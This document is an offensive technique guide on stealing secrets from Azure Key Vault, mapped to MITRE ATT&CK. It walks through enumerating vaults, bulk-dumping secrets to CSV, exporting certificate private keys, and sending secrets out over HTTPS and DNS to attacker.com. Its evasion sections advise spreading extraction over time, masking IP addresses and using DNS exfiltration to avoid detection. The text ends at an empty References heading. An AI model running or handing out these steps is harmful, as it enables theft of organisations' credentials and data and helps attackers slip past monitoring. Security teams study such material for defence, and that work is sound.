# CA-UNSC-007: Azure Key Vault Secret Extraction

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-007 |
| **MITRE ATT&CK v18.1** | [T1552.001 - Unsecured Credentials: Credentials in Files](https://attack.mitre.org/techniques/T1552/001/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID, Azure, Cloud-Native |
| **Severity** | Critical |
| **CVE** | CVE-2023-28432 (MinIO), Azure APIM Path Traversal (2025, Bounty: $40K) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-06 |
| **Affected Versions** | Azure Resource Manager (all regions), Entra ID (all versions) |
| **Patched In** | Partial: RBAC recommended over Access Policies; Cross-tenant mitigated via Azure APIM access control |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections have been dynamically renumbered based on applicability. All sections required for Azure credential access attacks are included. Cloud-specific sections (Windows Event Log, Sysmon) have been replaced with Azure diagnostic logging and Sentinel detection rules.

---

## 2. EXECUTIVE SUMMARY

### Concept
Azure Key Vault secret extraction is the unauthorized retrieval of cryptographic keys, certificates, and credentials stored in Microsoft Azure Key Vault—a cloud-based secrets management service used by organizations to protect application credentials, database connection strings, API keys, and certificates. Attackers exploit weak RBAC configurations, privilege escalation vulnerabilities in access policy management, or compromised service principal credentials to authenticate to Azure and enumerate/retrieve secrets stored in Key Vaults. The threat is amplified by Azure's global reach: a single compromised credential grants access to all secrets in a vault, potentially affecting hundreds of dependent applications and services. Unlike on-premises attacks requiring network access, cloud-based attacks succeed with valid authentication tokens from anywhere globally, making detection more challenging and impact more severe.

### Attack Surface
- **Azure RBAC Misconfigurations**: Over-privileged service principals with Key Vault Secrets Officer or Contributor roles
- **Access Policy Escalation**: Key Vault Contributor role can modify access policies to grant themselves "Get" permissions (privilege escalation vector)
- **Managed Identity Tokens**: Azure Instance Metadata Service (169.254.169.254) exposes managed identity tokens that can access Key Vaults
- **CI/CD Secret Leakage**: GitHub Actions, Azure DevOps, GitLab pipelines with exposed credentials in logs or environment variables
- **Cross-Tenant APIM Bypass**: Azure API Management path traversal enables access to other tenants' Key Vaults (CVE equivalent, Black Hat 2025)
- **Compromised Service Principals**: Valid Entra ID credentials for service accounts with Key Vault access
- **Application-Level Credential Files**: appSettings.json, config files, or hardcoded secrets in application code or containers

### Business Impact
**Compromised secrets from Azure Key Vaults enable attackers to authenticate to dependent applications, databases, cloud services, and APIs with legitimate credentials, providing persistent covert access to business-critical systems, customer data, and financial transaction processing systems with complete impunity.** Organizations report that stolen Key Vault secrets remain undetected for weeks or months because legitimate applications and services access the same credentials simultaneously, making anomalous access indistinguishable from normal operations.

### Technical Context
Azure Key Vault secret extraction typically requires either (1) valid Entra ID credentials for a principal with read permissions, (2) exploitation of access policy management privileges, or (3) abuse of managed identity tokens exposed via cloud instance metadata. Execution time is measured in seconds (single secret retrieval) to minutes (enumerating hundreds of secrets). Detection is challenging because legitimate application access generates identical logs to malicious extraction; behavioral analysis (unusual time of day, bulk retrieval patterns, IP reputation) is essential. Unlike on-premises environments with network segmentation, cloud attacks succeed globally if authentication is valid, regardless of IP address or geographic location.

---

### Operational Risk

| Dimension | Assessment | Details |
|---|---|---|
| **Execution Risk** | Low | Requires valid authentication only; no privilege escalation needed if permissions already granted |
| **Stealth** | High | Legitimate applications constantly access secrets; mass retrieval patterns easily hidden in normal traffic |
| **Reversibility** | No | Stolen secrets cannot be "un-stolen." Secrets rotation required (causes application downtime if not automated) |
| **Detection Likelihood** | Medium | Requires diagnostic logging enabled; most organizations don't have baseline for "normal" secret access patterns |
| **Global Reach** | Extreme | Can access vaults from any geographic location if authentication valid (no network boundary enforcement) |

---

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1.1, 5.1.2 | Manage secrets through Key Vault; use RBAC not access policies |
| **DISA STIG** | IA-4, SC-28 | Identifier Management; Information at Rest Protection (encryption keys) |
| **CISA SCuBA** | Identity 2.2, Data 1.3 | RBAC enforcement; secrets lifecycle management |
| **NIST 800-53** | SC-28, SC-7, AC-2 | Information at Rest; Boundary Protection; Account Management |
| **GDPR** | Art. 32, Art. 33 | Security of Processing (encrypt secrets); Breach notification if secrets compromised |
| **DORA** | Art. 9 | Protection and Prevention; critical infrastructure cryptographic key protection |
| **NIS2** | Art. 21 | Cyber Risk Management Measures; sensitive credential storage requirements |
| **ISO 27001** | A.10.1, A.8.3, A.9.2.3 | Cryptography Policy; Access Control; Privileged Access Management |
| **ISO 27005** | 8.3 | Risk Assessment; credential compromise scenario analysis |

---

## 3. TECHNICAL PREREQUISITES

### Required Privileges & Access

| Scenario | Required Access | Authentication Method |
|---|---|---|
| **Direct Vault Access (Read Secrets)** | RBAC: Key Vault Secrets User role (or higher) | Service Principal, User account, Managed Identity |
| **Access Policy Modification (Escalation)** | RBAC: Key Vault Contributor role | Service Principal, User account |
| **Managed Identity Token Abuse** | Compute instance with assigned identity | Cloud Shell, Azure VM, Container Instance |
| **Cross-Tenant Bypass** | Network access to shared APIM instance | Any authenticated user (if APIM misconfigured) |
| **Service Principal Creation** | RBAC: Application Administrator in Entra ID | Existing compromised Entra admin account |

---

### Supported Versions

| Azure Component | Supported | Details |
|---|---|---|
| **Azure Key Vault (Standard)** | ✅ All versions | Cloud-based key management service |
| **Key Vault Managed HSM** | ⚠️ Partial (HSM enforces key protection) | Keys non-exportable; secrets still readable |
| **Entra ID (formerly Azure AD)** | ✅ All versions | Authentication/authorization platform |
| **Azure Resource Manager** | ✅ All regions | Azure control plane; logs all Key Vault access |
| **PowerShell Az Module** | ✅ 5.0+ | Native Azure management tool |
| **Azure CLI** | ✅ 2.30+ | Command-line Azure management |
| **Logic Apps / Functions** | ✅ All versions | Managed identity token exposure risk |

---

### Required Tools & Components

| Tool | Version | URL | Purpose | Required |
|---|---|---|---|---|
| **PowerShell** | 7.0+ | [https://github.com/PowerShell/PowerShell](https://github.com/PowerShell/PowerShell) | Azure module execution | ✅ Yes |
| **Az Module** | 5.0+ | [https://learn.microsoft.com/en-us/powershell/azure/](https://learn.microsoft.com/en-us/powershell/azure/) | Azure resource management | ✅ Yes |
| **Azure CLI** | 2.30+ | [https://learn.microsoft.com/en-us/cli/azure/](https://learn.microsoft.com/en-us/cli/azure/) | Alternative to PowerShell | ⚠️ Optional |
| **BARK (BloodHound ARK)** | Latest | [https://github.com/BloodHoundAD/BARK](https://github.com/BloodHoundAD/BARK) | Azure privilege escalation/enumeration | ⚠️ Optional |
| **Impacket** | 0.10.0+ | [https://github.com/fortra/impacket](https://github.com/fortra/impacket) | Python Azure SDK alternative | ⚠️ Optional |
| **curl / Invoke-WebRequest** | Built-in | Native utilities | Managed Identity metadata service access | ⚠️ Optional |
| **jq** | 1.6+ | [https://stedolan.github.io/jq/](https://stedolan.github.io/jq/) | JSON parsing (Linux) | ⚠️ Optional |

---

### Azure Subscription & Entra ID Requirements

| Requirement | Details | Rationale |
|---|---|---|
| **Active Azure Subscription** | Standard, Enterprise, or trial | Required to access Key Vaults |
| **Entra ID Tenant Access** | User or service principal in tenant | Authentication and authorization checks |
| **Key Vault Diagnostic Logging** | Must be enabled (often disabled by default) | Required for detection; logs stored in Log Analytics Workspace |
| **Log Analytics Workspace** | Required for Sentinel detection rules | Central audit log repository |
| **.NET Framework / .NET 6+** | For PowerShell Az module | Runtime dependency |

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

#### Step 1: Discover Available Key Vaults

**Objective:** Enumerate all Azure Key Vaults accessible from current identity to identify targets containing high-value secrets (certificates, connection strings, API keys).

**Command (All Versions):**
```powershell
# Connect to Azure subscription
Connect-AzAccount

# List all Key Vaults in current subscription
Get-AzKeyVault | Select-Object VaultName, ResourceGroupName, Location

# Get more details (including access control model)
Get-AzKeyVault | ForEach-Object {
    Write-Host "Vault: $($_.VaultName)"
    Write-Host "  Resource Group: $($_.ResourceGroupName)"
    Write-Host "  Location: $($_.Location)"
    Write-Host "  Sku: $($_.Sku.Name)"
    Write-Host "  EnableRbacAuthorization: $($_.EnableRbacAuthorization)"
    Write-Host "  EnableSoftDelete: $($_.EnableSoftDelete)"
    Write-Host "  ---"
}

# Get subscription ID (for scoping)
$SubId = (Get-AzSubscription).Id
Write-Host "Current Subscription: $SubId"
```

**Expected Output:**
```
Vault: prod-keyvault-001
  Resource Group: production-rg
  Location: eastus
  Sku: Standard
  EnableRbacAuthorization: True
  EnableSoftDelete: True

Vault: dev-keyvault-002
  Resource Group: development-rg
  Location: westus
  Sku: Premium
  EnableRbacAuthorization: False
  EnableSoftDelete: False

Current Subscription: a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

**What This Means:**
- **VaultName**: Unique identifier for Key Vault
- **EnableRbacAuthorization**: True = RBAC-based access (modern); False = Access Policies (legacy, easier to exploit)
- **EnableSoftDelete**: True = Deleted secrets recoverable for 90 days; False = Permanent deletion immediately
- **Sku Premium**: Hardware Security Module (HSM) available (more secure)
- **Sku Standard**: Cloud-based storage (more common, higher attack surface)

**Red Flags (Vulnerable Configuration):**
- EnableRbacAuthorization = False (using deprecated Access Policies)
- EnableSoftDelete = False (deleted secrets unrecoverable; attacker hides track)
- Multiple vaults in subscription (higher target count)
- Premium SKU but EnableRbacAuthorization = False (misconfiguration)

**Version Note:** Command identical across all Azure regions and versions.

---

#### Step 2: Check Current User Permissions on Key Vault

**Objective:** Verify what permissions the current identity has on each Key Vault (will execution succeed? Are we blocked?).

**Command (All Versions - Check RBAC):**
```powershell
# Get current user/service principal context
$CurrentUser = (Get-AzContext).Account.Id
Write-Host "Current Identity: $CurrentUser"

# Check RBAC role assignments on Key Vault
$KeyVault = "prod-keyvault-001"
$ResourceGroupName = "production-rg"

Get-AzRoleAssignment -ResourceGroupName $ResourceGroupName -ResourceName $KeyVault -ResourceType "Microsoft.KeyVault/vaults" | Select-Object DisplayName, RoleDefinitionName, Scope

# Check specific role: do we have "Secrets User" or "Secrets Officer"?
$RoleAssignments = Get-AzRoleAssignment -ResourceGroupName $ResourceGroupName -ResourceName $KeyVault -ResourceType "Microsoft.KeyVault/vaults"
foreach ($Role in $RoleAssignments) {
    if ($Role.RoleDefinitionName -match "Secrets User|Secrets Officer|Contributor|Owner") {
        Write-Host "[+] Permission Granted: $($Role.RoleDefinitionName) for $($Role.DisplayName)" -ForegroundColor Green
    }
}
```

**Command (All Versions - Check Access Policies):**
```powershell
# If using legacy Access Policies (EnableRbacAuthorization = False)
$Vault = Get-AzKeyVault -VaultName "prod-keyvault-001" -ResourceGroupName "production-rg"

# List all access policies
$Vault.AccessPolicies | ForEach-Object {
    Write-Host "Principal: $($_.DisplayName)"
    Write-Host "  Object ID: $($_.ObjectId)"
    Write-Host "  Permissions - Secrets: $($_.PermissionsToSecrets)"
    Write-Host "  Permissions - Keys: $($_.PermissionsToKeys)"
    Write-Host "  Permissions - Certificates: $($_.PermissionsToCertificates)"
    Write-Host "  ---"
}
```

**Expected Output (RBAC - Secure Configuration):**
```
DisplayName                    RoleDefinitionName              Scope
-----------                    ------------------              -----
john.admin@contoso.com         Key Vault Secrets User          /subscriptions/.../prod-keyvault-001
svc_app@contoso.com            Key Vault Secrets Officer       /subscriptions/.../prod-keyvault-001
dev-team@contoso.com           Reader                          /subscriptions/.../prod-keyvault-001

[+] Permission Granted: Key Vault Secrets User for john.admin@contoso.com
[+] Permission Granted: Key Vault Secrets Officer for svc_app@contoso.com
```

**Expected Output (Access Policies - Legacy/Vulnerable):**
```
Principal: john.admin@contoso.com
  Object ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
  Permissions - Secrets: [get, list, set, delete]
  Permissions - Keys: [get, list, create, update, import, delete, backup, restore]
  Permissions - Certificates: [get, list, create, update, import, delete, backup, restore, managecontacts, manageissuers]

Principal: svc_app@contoso.com
  Object ID: b2c3d4e5-f6a7-8901-bcde-f12345678901
  Permissions - Secrets: [get, list]
  Permissions - Keys: []
  Permissions - Certificates: []
```

**What This Means (RBAC):**
- **Key Vault Secrets User**: Can only READ secrets (lowest privilege) ✅ Least privilege
- **Key Vault Secrets Officer**: Can READ, CREATE, UPDATE, DELETE secrets ⚠️ Administrative level
- **Contributor**: Can manage vaults AND modify access policies (privilege escalation vector!) ⚠️ Dangerous
- **Owner**: Full control (can always read secrets) ⚠️ Highest risk

**What This Means (Access Policies):**
- **get + list**: Can enumerate and retrieve secrets (attack enabler)
- **set + delete**: Can modify/destroy secrets (post-exploitation action)
- **Legacy model**: More vulnerable to privilege escalation

**Red Flags (Vulnerable Configuration):**
- Current user has "Contributor" role (can modify policies to grant self "Secrets Officer")
- Service account has "Secrets Officer" (more privilege than needed)
- Access policies include "List + Get" for unnecessary principals
- No "EnableRbacAuthorization" statement (defaults to Access Policies)

**Version Note:** RBAC structure identical across all Azure regions.

---

#### Step 3: Enumerate Secrets (Identify High-Value Targets)

**Objective:** List all secrets stored in accessible Key Vaults to prioritize extraction (database credentials > API keys > app secrets).

**Command (All Versions):**
```powershell
# List all secrets (names only, without values)
$Vault = "prod-keyvault-001"
$Secrets = Get-AzKeyVaultSecret -VaultName $Vault

Write-Host "Secrets in vault: $Vault" -ForegroundColor Cyan
$Secrets | Select-Object Name, Enabled, @{Name="LastUpdated";Expression={$_.Updated}} | Format-Table

# Identify high-value targets by name pattern
Write-Host "`nHigh-Value Targets (by name pattern):" -ForegroundColor Yellow
$Secrets | Where-Object {
    $_.Name -match "db.*password|connection.*string|api.*key|client.*secret|sql.*password|admin.*password"
} | Select-Object Name, Enabled

# Get secret versions (historical data)
$SecretName = "app-db-password"
Get-AzKeyVaultSecret -VaultName $Vault -Name $SecretName -IncludeVersions | Select-Object Name, Version, Created, Updated
```

**Expected Output:**
```
Secrets in vault: prod-keyvault-001

Name                         Enabled LastUpdated
----                         ------- -----------
app-db-password              True    12/28/2025 10:15:22 AM
app-api-key-stripe           True    12/27/2025 03:45:00 AM
client-secret-adfs           True    12/01/2025 08:22:15 AM
exchange-admin-password      True    11/15/2025 02:30:00 AM
databricks-token             True    12/20/2025 09:10:00 AM
github-pat-deploy            True    12/25/2025 11:22:00 AM

High-Value Targets (by name pattern):
Name                         Enabled
----                         -------
app-db-password              True
client-secret-adfs           True
exchange-admin-password      True

Version History for 'app-db-password':
Name                Version   Created                        Updated
----                -------   -------                        -------
app-db-password     abc123... 12/28/2025 10:15:22 AM        12/28/2025 10:15:22 AM
app-db-password     def456... 11/15/2025 09:30:00 AM        11/15/2025 09:30:00 AM
app-db-password     ghi789... 10/01/2025 03:00:00 AM        10/01/2025 03:00:00 AM
```

**What This Means:**
- **app-db-password**: Database credential (affects data access)
- **client-secret-adfs**: Service principal secret (affects authentication)
- **exchange-admin-password**: Admin credential (affects all Exchange resources)
- **Multiple versions**: Historical secrets may still work (if secrets rotation not enforced)
- **Last updated timestamp**: Older secrets more likely to be forgotten/unmonitored

**Red Flags (High-Value Targets):**
- Secrets with "admin", "password", "sql", "database" in name
- Secrets updated months ago (likely ignored/forgotten)
- Multiple versions of same secret (indicates poor rotation practices)

**Version Note:** Command identical across all Azure regions.

---

### Linux/Bash / Azure CLI Reconnaissance

#### Step 1: Discover Key Vaults via Azure CLI

**Objective:** Enumerate Key Vaults using Azure CLI (equivalent to PowerShell, useful in containerized environments).

**Command (All Versions - Bash):**
```bash
# Authenticate to Azure
az login

# List all Key Vaults in current subscription
az keyvault list --output table

# Get detailed information
az keyvault list --query "[].{Name:name, ResourceGroup:resourceGroup, Location:location, EnableRbac:properties.enableRbacAuthorization}"

# Get current user/service principal
az account show --query "user.name"

# List all subscriptions (find additional vaults)
az account list --output table
az account set --subscription "subscription-id"  # Switch subscription
```

**Expected Output:**
```
Name                          ResourceGroup      Location    EnableRbac
------------------------------  ----------------  ----------  ----------
prod-keyvault-001             production-rg      eastus      true
dev-keyvault-002              development-rg     westus      false
backup-keyvault-003           backup-rg          westeurope  true
```

**What This Means:**
- **EnableRbac: true**: RBAC-based access (harder to exploit)
- **EnableRbac: false**: Access Policies enabled (easier to exploit)

---

#### Step 2: List Secrets via Azure CLI

**Objective:** Enumerate secrets in Key Vault.

**Command (All Versions - Bash):**
```bash
# List all secrets (names only)
az keyvault secret list --vault-name prod-keyvault-001 --output table

# List with creation/update dates
az keyvault secret list --vault-name prod-keyvault-001 --query "[].{Name:name, Created:attributes.created, Updated:attributes.updated}" --output table

# Identify high-value targets
az keyvault secret list --vault-name prod-keyvault-001 --query "[?contains(name, 'password') || contains(name, 'api') || contains(name, 'connection')].[name]" --output tsv
```

**Expected Output:**
```
Name                          Created                        Updated
------------------------------  ----------------------------  ----------------------------
app-db-password               12/28/2025 10:15:22 AM        12/28/2025 10:15:22 AM
app-api-key-stripe            12/27/2025 03:45:00 AM        12/27/2025 03:45:00 AM
client-secret-adfs            12/01/2025 08:22:15 AM        12/01/2025 08:22:15 AM
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

---

### METHOD 1: Direct Secret Retrieval via PowerShell (Authorized Access)

**Supported Versions:** All Azure regions, all subscription types

**Prerequisites:** Entra ID authentication with "Key Vault Secrets User" or higher RBAC role; network connectivity to Azure (https://vault.azure.net)

---

#### Step 1: Authenticate to Azure

**Objective:** Obtain Entra ID access token required to authenticate all subsequent Key Vault operations.

**Command (Interactive User Login - All Versions):**
```powershell
# Interactive login (prompts for browser authentication)
Connect-AzAccount

# Verify successful authentication
$Context = Get-AzContext
Write-Host "Authenticated as: $($Context.Account.Id)"
Write-Host "Subscription: $($Context.Subscription.Name)"
```

**Command (Service Principal Authentication - All Versions):**
```powershell
# Using credentials (Username/Password)
$UserName = "svc_app@contoso.onmicrosoft.com"
$Password = ConvertTo-SecureString -String "P@ssw0rd" -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($UserName, $Password)
Connect-AzAccount -Credential $Credential

# Using certificate (more secure for automation)
$CertPath = "C:\Certs\app-cert.pfx"
$CertPassword = ConvertTo-SecureString -String "CertPass123" -AsPlainText -Force
$Cert = Import-PfxCertificate -FilePath $CertPath -Password $CertPassword -CertStoreLocation "Cert:\CurrentUser\My"

Connect-AzAccount -ServicePrincipal -Credential (New-Object System.Management.Automation.PSCredential(
    "a1b2c3d4-e5f6-7890-abcd-ef1234567890",  # Application ID
    (ConvertTo-SecureString -String $Cert.Thumbprint -AsPlainText -Force)
)) -TenantId "contoso.onmicrosoft.com"

# Using tenant/client secret
$TenantId = "contoso.onmicrosoft.com"
$AppId = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
$Secret = "client-secret-value"
$SecureSecret = ConvertTo-SecureString -String $Secret -AsPlainText -Force
Connect-AzAccount -ServicePrincipal -Credential (New-Object PSCredential($AppId, $SecureSecret)) -TenantId $TenantId
```

**Command (Managed Identity - From Azure Compute):**
```powershell
# Run from within Azure VM, Function App, Logic App, Container Instance
# Automatically uses assigned managed identity (no credentials needed)
Connect-AzAccount -Identity

# Verify
$Context = Get-AzContext
Write-Host "Connected with Managed Identity: $($Context.Account.Id)"
```

**Expected Output (Successful):**

```
Account             SubscriptionName             TenantId                             Environment
-------             ----------------             --------                             -----------
user@contoso.com    Production-Subscription      a1b2c3d4-e5f6-7890-abcd-ef1234567890 AzureCloud

Authenticated as: user@contoso.com
Subscription: Production-Subscription
```

**What This Means:**
- **Account**: Identity used for authentication
- **TenantId**: Entra ID tenant (organization ID)
- **SubscriptionName**: Azure subscription (billing/resource container)
- **Environment**: Azure cloud type (AzureCloud = public; AzureUSGovernment = gov)

**Version Note:** Authentication method identical across all Azure regions and subscription types.

**OpSec & Evasion:**
- **Detection Risk**: MEDIUM - Entra ID logs sign-in; IP reputation checked
- **Evasion**:
  1. Use service principal instead of user account (appears as application, less suspicious)
  2. Authenticate during business hours
  3. Use corporate VPN/proxy to mask true IP
  4. Chain multiple sign-ins to hide intent

**Troubleshooting:**
- **Error:** "The access token has expired"
  - **Cause**: Token lifetime exceeded (default 1 hour)
  - **Fix (All)**: Re-run Connect-AzAccount
  
- **Error:** "Invalid credentials"
  - **Cause**: Wrong password, certificate, or secret
  - **Fix (All)**: Verify credentials, check certificate expiration, confirm secret value

**References:**
- [Azure PowerShell Authentication Documentation](https://learn.microsoft.com/en-us/powershell/azure/authenticate-azureps)
- [Managed Identity in Azure](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/overview)

---

#### Step 2: Retrieve Individual Secrets

**Objective:** Extract plaintext values of secrets from Key Vault using authenticated session.

**Command (Get Single Secret - All Versions):**
```powershell
# Retrieve secret value as plaintext
$VaultName = "prod-keyvault-001"
$SecretName = "app-db-password"

$Secret = Get-AzKeyVaultSecret -VaultName $VaultName -Name $SecretName -AsPlainText
Write-Host "Secret Value: $Secret"

# Alternative: Retrieve and pipe to clipboard (for later use)
$Secret | Set-Clipboard
Write-Host "[+] Secret copied to clipboard"

# Retrieve without plaintext (returns SecureString - encrypted in memory)
$SecureSecret = Get-AzKeyVaultSecret -VaultName $VaultName -Name $SecretName
# Convert SecureString to plaintext if needed
$PlainSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto(
    [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemAlloc($SecureSecret.SecretValue)
)
Write-Host "Decrypted: $PlainSecret"
```

**Command (Get All Secrets - Bulk Retrieval):**
```powershell
# Enumerate and retrieve all secrets in vault
$VaultName = "prod-keyvault-001"
$AllSecrets = Get-AzKeyVaultSecret -VaultName $VaultName

# Create CSV export
$SecretData = @()
foreach ($Secret in $AllSecrets) {
    $Value = Get-AzKeyVaultSecret -VaultName $VaultName -Name $Secret.Name -AsPlainText
    $SecretData += New-Object PSObject -Property @{
        Name = $Secret.Name
        Value = $Value
        Created = $Secret.Created
        Updated = $Secret.Updated
        Enabled = $Secret.Enabled
    }
}

# Export to file
$SecretData | Export-Csv -Path "C:\Temp\extracted_secrets.csv" -NoTypeInformation
Write-Host "[+] Secrets exported to C:\Temp\extracted_secrets.csv"

# Summary
Write-Host "[+] Total secrets retrieved: $($SecretData.Count)"
$SecretData | Select-Object Name, Value | Format-Table
```

**Expected Output (Single Secret):**
```
Secret Value: Server=sqldb.database.windows.net;Database=ProductionDB;User ID=sa;Password=Sup3rS3cur3P@ss!
[+] Secret copied to clipboard
```

**Expected Output (Bulk Retrieval):**
```
[+] Secrets exported to C:\Temp\extracted_secrets.csv
[+] Total secrets retrieved: 6

Name                          Value
----                          -----
app-db-password               Server=sqldb.database.windows.net;Database=ProductionDB;User ID=sa;Password=Sup3rS3cur3P@ss!
app-api-key-stripe            sk_live_51HZ7LC2eZvKa46r0N59a5zX8K0pXR6n3Y8m9O0p1Q2r3S4t5U6v7W8x9Y0z1A2b
client-secret-adfs            a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f
exchange-admin-password       ExchAdmin@2025!
databricks-token              dapi12345abcde67890fghij
github-pat-deploy             ghp_1234567890abcdefghijklmnopqrstuvwxyz
```

**What This Means:**
- **Connection string**: Database credentials (can authenticate as admin to production DB)
- **API keys**: Service authentication (can impersonate application in external services)
- **Client secrets**: Azure app authentication (can request access tokens as service principal)
- **Admin passwords**: Direct credential access (can login as admin to critical systems)
- **Tokens**: API authentication (can access GitHub repos, Databricks clusters)

**Business Impact (Post-Extraction):**
- **Database access**: Read/modify customer data
- **External API access**: Abuse cloud services (billing impact), access partner systems
- **Admin access**: Change user passwords, grant permissions, delete resources
- **Persistence**: Use credentials to maintain long-term access

**Version Note:** Command identical across all Azure regions.

**OpSec & Evasion:**
- **Detection Risk**: MEDIUM-HIGH - Bulk retrieval of 10+ secrets triggers alerts
- **Evasion**:
  1. Extract one secret at a time (spread over hours/days)
  2. Use natural intervals matching business operations
  3. Target only essential secrets (not all at once)
  4. Avoid Export-Csv (leaves file artifacts); use Out-String instead

**Troubleshooting:**
- **Error:** "The user, group or application has no access"
  - **Cause**: Insufficient RBAC permissions
  - **Fix (All)**: Request "Key Vault Secrets User" role assignment

- **Error:** "Secret not found"
  - **Cause**: Secret name incorrect or doesn't exist
  - **Fix (All)**:
    1. List all secrets: `Get-AzKeyVaultSecret -VaultName $VaultName`
    2. Verify exact name match
    3. Confirm secret is enabled: `Get-AzKeyVaultSecret -VaultName $VaultName -Name $Name | Select-Object Enabled`

**References:**
- [Get-AzKeyVaultSecret Documentation](https://learn.microsoft.com/en-us/powershell/module/az.keyvault/get-azkeyvaultsecret)

---

#### Step 3: Extract Certificates with Private Keys

**Objective:** Export certificates including private keys from Key Vault (enables certificate-based authentication/signing).

**Command (Export Certificate as PFX - All Versions):**
```powershell
# Retrieve certificate object
$VaultName = "prod-keyvault-001"
$CertName = "app-signing-cert"

$Cert = Get-AzKeyVaultCertificate -VaultName $VaultName -Name $CertName
Write-Host "Certificate: $($Cert.Name)"
Write-Host "Thumbprint: $($Cert.Thumbprint)"
Write-Host "Expires: $($Cert.Expires)"

# Export as Base64 (can be imported anywhere)
$CertBytes = $Cert.Cer
$CertBase64 = [Convert]::ToBase64String($CertBytes)
Write-Host "Certificate (Base64): $CertBase64" | Out-File "C:\Temp\cert.txt"

# Get private key (if available)
$SecretId = $Cert.SecretId
$CertSecret = Get-AzKeyVaultSecret -VaultName $VaultName -Name $CertName
$CertBytes = [Convert]::FromBase64String($CertSecret.SecretValue)
[System.IO.File]::WriteAllBytes("C:\Temp\export_cert.pfx", $CertBytes)

Write-Host "[+] Certificate exported to C:\Temp\export_cert.pfx"
```

**Command (Export as PEM - For Linux/OpenSSL):**
```powershell
# Export PFX and convert to PEM on Windows
$PfxPath = "C:\Temp\export_cert.pfx"

# Or on Linux
# openssl pkcs12 -in export_cert.pfx -out export_cert.pem -nodes
```

**Expected Output:**
```
Certificate: app-signing-cert
Thumbprint: ABC123DEF456ABC123DEF456ABC123DEF456AB
Expires: 06/15/2027 11:59:59 PM
[+] Certificate exported to C:\Temp\export_cert.pfx
```

**What This Means:**
- **Thumbprint**: Unique certificate identifier (use to authenticate as app)
- **Private key exported**: Can now forge signatures/tokens using this cert
- **.pfx file**: Contains both cert and private key; import on attacker system

**Post-Extraction Uses:**
- **Token signing**: Forge JWT tokens for authentication (if cert used for OAuth/OIDC)
- **Certificate authentication**: Use with client cert auth (e.g., mutual TLS)
- **Email signing**: S/MIME if used for email encryption
- **Document signing**: Digital signatures on PDF/Office documents

**Version Note:** Command identical across all Azure regions.

**Troubleshooting:**
- **Error:** "Certificate not found"
  - **Cause**: Certificate name incorrect
  - **Fix (All)**: List certificates: `Get-AzKeyVaultCertificate -VaultName $VaultName`

- **Error:** "Access denied to certificate private key"
  - **Cause**: Insufficient permissions (need "Key Vault Secrets Officer" for certificates)
  - **Fix (All)**: Request higher RBAC role for current identity

**References:**
- [Get-AzKeyVaultCertificate Documentation](https://learn.microsoft.com/en-us/powershell/module/az.keyvault/get-azkeyvaultcertificate)

---

#### Step 4: Exfiltrate Secrets to Attacker Infrastructure

**Objective:** Transfer extracted secrets to attacker-controlled system for storage and usage.

**Command (HTTPS Exfiltration - Lowest Detection):**
```powershell
# Send secrets to attacker-controlled server (TLS-encrypted)
$Secrets = @{
    "app-db-password" = Get-AzKeyVaultSecret -VaultName "prod-keyvault-001" -Name "app-db-password" -AsPlainText
    "api-key-stripe" = Get-AzKeyVaultSecret -VaultName "prod-keyvault-001" -Name "app-api-key-stripe" -AsPlainText
}

$JsonBody = $Secrets | ConvertTo-Json
$Uri = "https://attacker.com:8443/upload"
$Response = Invoke-WebRequest -Uri $Uri -Method POST -Body $JsonBody -ContentType "application/json"
Write-Host "[+] Secrets sent to $Uri"
```

**Command (DNS Exfiltration - Stealthy, Slow):**
```powershell
# For highly monitored networks
$Secret = Get-AzKeyVaultSecret -VaultName "prod-keyvault-001" -Name "app-db-password" -AsPlainText
$Bytes = [System.Text.Encoding]::UTF8.GetBytes($Secret)
$Base64 = [Convert]::ToBase64String($Bytes)

# Send in chunks via DNS queries
for ($i=0; $i -lt $Base64.Length; $i+=32) {
    $Chunk = $Base64.Substring($i, [Math]::Min(32, $Base64.Length - $i))
    nslookup "$Chunk.attacker.com"
}
```

**Command (File Export - Local Storage):**
```powershell
# Export all secrets to encrypted file (for later transmission)
$VaultName = "prod-keyvault-001"
$AllSecrets = Get-AzKeyVaultSecret -VaultName $VaultName

$Export = @()
foreach ($Secret in $AllSecrets) {
    $Value = Get-AzKeyVaultSecret -VaultName $VaultName -Name $Secret.Name -AsPlainText
    $Export += "$($Secret.Name)=$Value"
}

# Encrypt before saving
$Password = ConvertTo-SecureString -String "ExfiltrationPassword123" -AsPlainText -Force
$EncryptedFile = "C:\Temp\secrets.enc"
$Export | ConvertTo-Json | ConvertTo-SecureString -AsPlainText -Force | Export-Clixml -Path $EncryptedFile
Write-Host "[+] Secrets encrypted and saved to $EncryptedFile"
```

**Expected Output:**
```
[+] Secrets sent to https://attacker.com:8443/upload
[+] Response: 200 OK - Successfully processed
```

**What This Means:**
- **Exfiltration successful**: Secrets now available to attacker globally
- **Offline storage**: Attacker can use secrets even if Azure account is discovered/disabled
- **Persistence**: Credentials remain valid until organization rotates them

**Version Note:** Network behavior identical across all Azure regions.

**OpSec & Evasion:**
- **Detection Risk**: CRITICAL if monitoring network traffic
- **Evasion**:
  1. Use DNS exfiltration (harder to detect, smaller packets)
  2. Compress and encrypt payload before sending
  3. Chunk transmission (avoid large single requests)
  4. Use legitimate-looking domain names for C2
  5. Randomize timing of exfiltration

**Troubleshooting:**
- **Error:** "Network error - connection refused"
  - **Cause**: Attacker server not listening or firewall blocking
  - **Fix**: Test connectivity: `Test-NetConnection attacker.com -Port 8443`

**References:**
